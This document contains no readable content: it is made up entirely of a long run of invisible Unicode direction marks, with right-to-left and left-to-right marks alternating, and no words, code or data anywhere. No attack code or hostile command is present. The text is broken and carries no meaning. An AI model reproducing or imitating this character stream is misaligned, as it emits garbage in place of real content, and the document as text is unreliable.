‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏